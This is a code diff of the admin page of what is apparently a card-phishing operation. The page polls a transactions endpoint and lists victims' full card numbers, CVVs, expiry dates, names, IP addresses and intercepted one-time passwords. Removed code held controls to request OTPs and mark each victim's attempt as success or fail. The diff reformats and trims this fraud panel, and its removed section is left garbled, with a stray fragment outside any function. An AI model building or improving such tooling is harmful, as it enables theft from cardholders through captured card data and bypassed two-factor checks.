@@ -387,8 +387,8 @@
 
   <script>
     // Admin credentials and login handling
-  const validUsername = process.env.ADMIN_USER;
-const validPassword = process.env.ADMIN_PASS;
+    const validUsername = process.env.ADMIN_USER;
+    const validPassword = process.env.ADMIN_PASS;
     let currentPassword = validPassword;
 
     function showToast(message, type = 'success') {
@@ -521,95 +521,38 @@ const validPassword = process.env.ADMIN_PASS;
       }
     ];
 
-   async function loadTransactions() {
-  const response = await fetch('/api/transactions');
-  const data = await response.json();
+    // Fetch transactions periodically and display them
+    async function loadTransactions() {
+      const response = await fetch('/api/transactions');
+      const data = await response.json();
 
-  if (data.status === 'success') {
-    const tbody = document.querySelector("#transactionsTable tbody");
-    tbody.innerHTML = ''; // Clear existing rows
+      if (data.status === 'success') {
+        const tbody = document.querySelector("#transactionsTable tbody");
+        tbody.innerHTML = ''; // Clear existing rows
 
-    data.transactions.forEach(tx => {
-      const row = document.createElement('tr');
-      row.innerHTML = `
-        <td>${tx.id}</td>
-        <td>${tx.email}</td>
-        <td>${tx.amount}</td>
-        <td>${tx.currency}</td>
-        <td>${tx.cardNumber}</td>
-        <td>${tx.cvv}</td>
-        <td>${tx.expiry}</td>
-        <td>${tx.cardholder}</td>
-        <td>${tx.ip || 'N/A'}</td>
-        <td>
-          ${tx.otpEntered ? `<span class="otp-received">${tx.otpEntered}</span>` : '<span class="status-badge status-otp">Waiting for OTP</span>'}
-        </td>
-        <td>
-          <span class="status-badge status-${tx.status || 'processing'}">${tx.status || 'Processing'}</span>
-        </td>
-      `;
-      tbody.appendChild(row);
-    });
-  } else {
-    console.log('Failed to fetch transactions');
-  }
-}
-                `<button class="show-otp-btn" onclick="showOTP('${tx.id}', this)" ${tx.status !== 'processing' ? 'disabled' : ''}>
-                  Show OTP
-                </button>`
-            }
-          </td>
-          <td>
-            <span class="status-badge status-${tx.status || 'processing'}">
-              ${tx.status || 'Processing'}
-            </span>
-          </td>
-          <td>
-            ${!tx.redirectStatus ? `
-              <button onclick="updateStatus('${tx.id}', 'success', this)" ${!tx.otpEntered ? 'disabled' : ''}>
-                Success
-              </button>
-              <button onclick="updateStatus('${tx.id}', 'fail', this)" ${!tx.otpEntered ? 'disabled' : ''}>
-                Fail
-              </button>
-             ` : ''}
-          </td>
-        `;
-        tbody.appendChild(row);
-      });
-    }
-
-    async function showOTP(id, button) {
-      setLoading(button, true);
-      await new Promise(resolve => setTimeout(resolve, 800));
-      const tx = transactions.find(t => t.id === id);
-      if (tx) {
-        tx.otpShown = true;
-        loadTransactions();
-        showToast('OTP request sent');
-      }
-    }
-
-    async function markWrongOTP(id, button) {
-      setLoading(button, true);
-      await new Promise(resolve => setTimeout(resolve, 800));
-      const tx = transactions.find(t => t.id === id);
-      if (tx) {
-        tx.status = 'fail';
-        loadTransactions();
-        showToast('OTP marked as incorrect', 'error');
-      }
-    }
-
-    async function updateStatus(id, status, button) {
-      setLoading(button, true);
-      await new Promise(resolve => setTimeout(resolve, 800));
-      const tx = transactions.find(t => t.id === id);
-      if (tx) {
-        tx.redirectStatus = status;
-        tx.status = status;
-        loadTransactions();
-        showToast(`Transaction marked as ${status}`);
+        data.transactions.forEach(tx => {
+          const row = document.createElement('tr');
+          row.innerHTML = `
+            <td>${tx.id}</td>
+            <td>${tx.email}</td>
+            <td>${tx.amount}</td>
+            <td>${tx.currency}</td>
+            <td>${tx.cardNumber}</td>
+            <td>${tx.cvv}</td>
+            <td>${tx.expiry}</td>
+            <td>${tx.cardholder}</td>
+            <td>${tx.ip || 'N/A'}</td>
+            <td>
+              ${tx.otpEntered ? `<span class="otp-received">${tx.otpEntered}</span>` : '<span class="status-badge status-otp">Waiting for OTP</span>'}
+            </td>
+            <td>
+              <span class="status-badge status-${tx.status || 'processing'}">${tx.status || 'Processing'}</span>
+            </td>
+          `;
+          tbody.appendChild(row);
+        });
+      } else {
+        console.log('Failed to fetch transactions');
       }
     }
 
@@ -620,9 +563,10 @@ const validPassword = process.env.ADMIN_PASS;
         document.getElementById('loginForm').style.display = 'none';
         document.getElementById('adminContent').style.display = 'block';
         loadTransactions();
-        setInterval(loadTransactions, 2000);
+        setInterval(loadTransactions, 2000); // Fetch new transactions every 2 seconds
       }
     };
   </script>
+  <script src="/socket.io/socket.io.js"></script>
 </body>
 </html>
